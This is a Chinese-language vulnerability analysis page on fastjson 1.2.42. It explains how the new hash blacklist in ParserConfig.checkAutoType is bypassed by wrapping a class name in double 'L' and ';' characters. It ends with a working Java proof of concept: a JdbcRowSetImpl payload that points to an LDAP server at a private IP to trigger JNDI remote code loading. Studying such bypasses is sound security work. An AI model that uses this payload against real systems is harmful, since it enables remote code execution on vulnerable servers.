.. _1.2.42:

版本1.2.42
=============

漏洞说明
----------

在ParserConfig类的checkAutoType函数中增加hash黑名单，对去掉前后\"L\"和\";\"字符后的类名进行匹配，如果前几位满足匹配的hash值，则直接返回异常。\"com.sun\"字符串在hash黑名单中，原有 :ref:`1.2.41` 的POC不再生效。

如果不在黑名单中，则会在后续未做修改的TypeUtils类的loadClass函数中，还会对输入类名做前后\"L\"和\";\"字符去除后再匹配。通过增加两层字符\"L\"和\";\"，就可以绕过该版本的判断机制。


调试
-------

.. figure:: images/1.2.42/ParserConfig-checkAutoType42-1.png

   ParserConfig.checkAutoType

   从1.2.42版本开始，不再直接匹配字符串，而是匹配hash值。在checkAutoType函数中，是先去掉\"L\"和\";\"，再比较类型名称，如果匹配denyHashCodes中的值，则直接抛异常返回。 :ref:`1.2.41` 中的POC不再适用。acceptHashCodes中保存的是白名单的类型名称hash值。

   通过在传入类型名称前后增加两层\"L\"和\";\"，当通过hash判断去掉最外层的\"L\"和\";\"后，类型名称还带着一层\"L\"和\";\"，进入TypeUtils.loadClass函数后，与此前的处理逻辑一样，去掉\"L\"和\";\"后从系统环境中找类型名称并返回。

   ParserConfig.checkAutoType函数主要用于对类型名称进行黑白名单判断，TypeUtils.loadClass函数用于从缓存和系统环境中查找类型名称。


POC
------

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://192.168.0.102:1389/ExTest\", \"autoCommit\":true}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }
